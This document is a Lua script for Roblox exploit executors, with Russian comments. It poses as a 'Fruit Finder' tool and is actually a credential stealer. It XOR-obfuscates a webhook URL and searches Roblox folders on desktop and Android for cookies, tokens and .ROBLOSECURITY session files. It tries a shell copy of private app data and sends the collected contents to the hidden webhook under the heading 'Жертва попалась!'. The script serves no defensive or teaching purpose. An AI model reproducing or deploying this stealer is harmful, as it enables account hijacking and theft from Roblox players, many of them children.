-- === НАСТРОЙКИ ===
local key = 123
local encrypted_webhook = {
    19, 15, 15, 11, 8, 65, 84, 84, 31, 18, 8, 24, 20, 9, 31, 85, 24, 20, 22, 84,
    26, 11, 18, 84, 12, 30, 25, 19, 20, 20, 16, 8, 84, 74, 78, 79, 74, 66, 73,
    74, 74, 79, 67, 74, 74, 79, 74, 67, 73, 73, 73, 79, 84, 29, 23, 75, 53, 41,
    34, 16, 24, 15, 57, 9, 34, 41, 66, 86, 22, 24, 44, 16, 17, 41, 33, 55, 62,
    30, 44, 44, 10, 41, 40, 28, 47, 55, 57, 35, 15, 62, 11, 21, 75, 47, 73, 24,
    66, 46, 73, 14, 73, 35, 62, 79, 48, 57, 14, 12, 44, 67, 76, 33, 41, 76, 53,
    19, 11, 9, 1, 1, 62
}

-- === XOR ===
local function pure_bxor(a, b)
    local result = 0
    local bitval = 1
    while a > 0 or b > 0 do
        local abit = a % 2
        local bbit = b % 2
        if abit ~= bbit then
            result = result + bitval
        end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        bitval = bitval * 2
    end
    return result
end
local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or pure_bxor

local function decrypt(data, key)
    local bytes = {}
    for _, b in ipairs(data) do
        table.insert(bytes, string.char(bxor(b, key)))
    end
    return table.concat(bytes)
end

local webhook = decrypt(encrypted_webhook, key)
print("[DEBUG] Вебхук расшифрован:", webhook)

-- === ОТПРАВКА ===
local function sendToWebhook(data)
    local HttpService = game:GetService("HttpService")
    local payload = {
        content = "**Украденные данные Роблокс**",
        embeds = {{
            title = "Жертва попалась!",
            description = data,
            color = 16711680
        }}
    }
    local json = HttpService:JSONEncode(payload)

    -- 1. Пробуем request (доступен в Xeno)
    if request then
        local ok, err = pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        if ok then
            print("[DEBUG] Отправлено через request")
            return true
        end
        warn("[DEBUG] request failed:", err)
    end

    -- 2. Пробуем http_request
    if http_request then
        local ok, err = pcall(function()
            http_request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
        if ok then
            print("[DEBUG] Отправлено через http_request")
            return true
        end
        warn("[DEBUG] http_request failed:", err)
    end

    -- 3. Пробуем game.HttpPost (кастомная функция Xeno)
    if game.HttpPost then
        local ok, err = pcall(function()
            game.HttpPost(webhook, json, "application/json")
        end)
        if ok then
            print("[DEBUG] Отправлено через game.HttpPost")
            return true
        end
        warn("[DEBUG] game.HttpPost failed:", err)
    end

    -- 4. Пробуем глобальный HttpPost
    if HttpPost then
        local ok, err = pcall(function()
            HttpPost(webhook, json, "application/json")
        end)
        if ok then
            print("[DEBUG] Отправлено через HttpPost (global)")
            return true
        end
        warn("[DEBUG] HttpPost (global) failed:", err)
    end

    -- 5. Пробуем HttpService.PostAsync (вдруг разблокируется)
    if HttpService and HttpService.PostAsync then
        local ok, err = pcall(function()
            HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
        end)
        if ok then
            print("[DEBUG] Отправлено через HttpService")
            return true
        end
        warn("[DEBUG] HttpService.PostAsync failed:", err)
    end

    warn("[DEBUG] Все методы отправки не удались")
    return false
end

-- === ИНФОРМАЦИЯ ОБ АККАУНТЕ ===
local function getAccountInfo()
    local player = game.Players.LocalPlayer
    if not player then
        return "**Игрок не найден**"
    end
    local info = ""
    info = info .. "**UserID:** " .. tostring(player.UserId) .. "\n"
    info = info .. "**Username:** " .. tostring(player.Name) .. "\n"
    info = info .. "**DisplayName:** " .. tostring(player.DisplayName or "N/A") .. "\n"
    local userId = player.UserId
    local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
    info = info .. "**Thumbnail:** " .. thumb .. "\n"
    if game:GetService("RunService"):IsStudio() then
        info = info .. "**Окружение:** Roblox Studio\n"
    else
        info = info .. "**Окружение:** Roblox Client\n"
    end
    return info
end

-- === БЕЗОПАСНЫЕ ПУТИ ===
local function safePath(env, suffix)
    local ok, val = pcall(os.getenv, env)
    if ok and val and val ~= "" then
        return val .. suffix
    end
    return nil
end

local function getBasePaths()
    local paths = {
        -- Windows
        safePath("APPDATA", "\\Roblox"),
        safePath("LOCALAPPDATA", "\\Roblox"),
        safePath("USERPROFILE", "\\AppData\\Local\\Roblox"),
        safePath("USERPROFILE", "\\AppData\\Roaming\\Roblox"),
        safePath("USERPROFILE", "\\Roblox"),
        safePath("LOCALAPPDATA", "\\Roblox\\Cookies"),
        safePath("LOCALAPPDATA", "\\Roblox\\Local Storage"),
        safePath("LOCALAPPDATA", "\\Roblox\\Local State"),
        safePath("APPDATA", "\\Roblox\\Cookies"),
        safePath("APPDATA", "\\Roblox\\Local Storage"),
        safePath("APPDATA", "\\Roblox\\Local State"),
        -- macOS / Linux
        safePath("HOME", "/Library/Application Support/Roblox"),
        safePath("HOME", "/.roblox"),
        safePath("HOME", "/.config/roblox"),
        "/root/.roblox",
        -- Android
        "/data/data/com.roblox.client",
        "/data/user/0/com.roblox.client",
        "/data/data/com.roblox.client/shared_prefs",
        "/data/data/com.roblox.client/files",
        "/data/data/com.roblox.client/databases",
        "/data/data/com.roblox.client/app_webview",
        "/data/data/com.roblox.client/cache",
        "/data/data/com.roblox.client/no_backup",
        "/storage/emulated/0/Android/data/com.roblox.client",
        "/sdcard/Android/data/com.roblox.client"
    }
    local clean = {}
    for _, p in ipairs(paths) do
        if p then table.insert(clean, p) end
    end
    return clean
end

-- === ПОПЫТКА ВЫПОЛНИТЬ SHELL-КОМАНДУ ===
local function tryShellCommand(cmd)
    if os and os.execute then
        local ok, result = pcall(os.execute, cmd)
        if ok and result then
            return true, result
        end
    end
    if execute_command then
        local ok, result = pcall(execute_command, cmd)
        if ok and result then
            return true, result
        end
    end
    return false, "нет доступа к shell"
end

-- === СКАНИРОВАНИЕ ФАЙЛОВ ===
local function scanFolder(folder, pattern, recursive)
    local found = {}
    if not listfiles or not isfile or not isfolder then
        return found
    end
    local success, list = pcall(listfiles, folder)
    if not success or not list then
        return found
    end
    for _, item in ipairs(list) do
        local fullPath = folder .. "/" .. item
        local isFile = pcall(isfile, fullPath)
        if isFile then
            if string.lower(item):match(pattern) then
                table.insert(found, fullPath)
            end
        else
            local isFolder = pcall(isfolder, fullPath)
            if isFolder and recursive then
                local subfound = scanFolder(fullPath, pattern, true)
                for _, f in ipairs(subfound) do
                    table.insert(found, f)
                end
            end
        end
    end
    return found
end

local function stealAllData()
    local collected = {}
    local pattern = "cookie|session|auth|token|roblosecurity|settings|preferences|account|login|log|globalbasic|globalsettings|identity|credential|key|%.roblox|%.rbxs|%.dat|%.json|%.xml"
    local basePaths = getBasePaths()
    print("[DEBUG] Путей для сканирования:", #basePaths)

    for _, base in ipairs(basePaths) do
        local isFolder = pcall(isfolder, base)
        if isFolder then
            print("[DEBUG] Сканирую:", base)
            local files = scanFolder(base, pattern, true)
            print("[DEBUG] Найдено файлов:", #files)
            for _, f in ipairs(files) do
                local ok, content = pcall(readfile, f)
                if ok and content and content ~= "" then
                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                end
            end
        else
            local isFile = pcall(isfile, base)
            if isFile and string.lower(base):match(pattern) then
                local ok, content = pcall(readfile, base)
                if ok and content then
                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                end
            end
        end
    end

    -- Попытка shell-копирования приватных файлов Android
    local androidPrivate = "/data/data/com.roblox.client"
    local tempCopy = "/sdcard/roblox_temp_copy"
    local shellOk, shellRes = tryShellCommand("cp -R " .. androidPrivate .. " " .. tempCopy .. " 2>/dev/null")
    if shellOk then
        print("[DEBUG] Shell-копирование выполнено, результат:", shellRes)
        if isfolder and isfolder(tempCopy) then
            local copiedFiles = scanFolder(tempCopy, pattern, true)
            for _, f in ipairs(copiedFiles) do
                local ok, content = pcall(readfile, f)
                if ok and content then
                    table.insert(collected, "**Скопированный файл (через shell):** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                end
            end
        end
    else
        print("[DEBUG] Shell недоступен или ошибка:", shellRes)
    end

    -- Прямые файлы
    local directFiles = {
        safePath("APPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
        safePath("LOCALAPPDATA", "\\Roblox\\GlobalBasicSettings_13.xml"),
        safePath("USERPROFILE", "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml"),
        safePath("HOME", "/Library/Application Support/Roblox/GlobalBasicSettings_13.xml"),
        safePath("HOME", "/.roblox/GlobalBasicSettings_13.xml"),
        safePath("HOME", "/.config/roblox/GlobalBasicSettings_13.xml"),
        "/data/data/com.roblox.client/shared_prefs/roblox.xml",
        "/data/data/com.roblox.client/shared_prefs/Roblox.xml",
        "/data/data/com.roblox.client/files/GlobalBasicSettings_13.xml",
        "/storage/emulated/0/Android/data/com.roblox.client/files/GlobalBasicSettings_13.xml"
    }
    for _, f in ipairs(directFiles) do
        if f then
            local isFile = pcall(isfile, f)
            if isFile then
                local ok, content = pcall(readfile, f)
                if ok and content then
                    table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                end
            end
        end
    end

    -- Если всё ещё пусто, ищем .ROBLOSECURITY в любых доступных файлах
    if #collected == 0 then
        print("[DEBUG] Первичный сбор пуст, ищу .ROBLOSECURITY во всех файлах...")
        for _, base in ipairs(basePaths) do
            local isFolder = pcall(isfolder, base)
            if isFolder then
                local allFiles = scanFolder(base, ".*", true)
                for _, f in ipairs(allFiles) do
                    local ok, content = pcall(readfile, f)
                    if ok and content and tostring(content):find(".ROBLOSECURITY") then
                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 10000) .. "\n```")
                    end
                end
            end
        end
    end

    print("[DEBUG] Всего собрано записей:", #collected)
    return table.concat(collected, "\n\n---\n\n")
end

-- === ОСНОВНАЯ ФУНКЦИЯ ===
local function main()
    print("[DEBUG] main вызван")
    local data = getAccountInfo()
    print("[DEBUG] Информация об аккаунте:", data)

    local ok, stolenData = pcall(stealAllData)
    if not ok then
        stolenData = "**Ошибка при сборе файлов:** " .. tostring(stolenData)
        warn("[DEBUG] Ошибка stealAllData:", stolenData)
    else
        print("[DEBUG] Собрано данных (первые 200):", tostring(stolenData):sub(1,200))
    end

    if stolenData and stolenData ~= "" then
        data = data .. "\n\n**Собранные данные:**\n" .. stolenData
    else
        data = data .. "\n\n**Данные не найдены (возможно, эксплоит не имеет доступа к файлам).**"
    end

    print("[DEBUG] Итоговое сообщение (первые 300):", data:sub(1,300))
    local sent = sendToWebhook(data)
    print("[DEBUG] Отправка завершена, результат:", sent)
end

-- === ЗАПУСК ===
delay(2, function()
    print("[DEBUG] Скрипт запущен")
    local success, err = pcall(main)
    if not success then
        warn("[DEBUG] Критическая ошибка в main:", err)
    end
end)

-- === GUI-ЗАГЛУШКА ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
Frame.Parent = ScreenGui
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1,0,1,0)
Label.Text = "BlackBirdTeam Fruit Finder v1.0 - Загрузка..."
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.SourceSansBold
Label.TextSize = 14
Label.Parent = Frame
delay(5, function()
    if ScreenGui and ScreenGui.Parent then
        ScreenGui:Destroy()
    end
end)

print("[DEBUG] Скрипт полностью загружен")
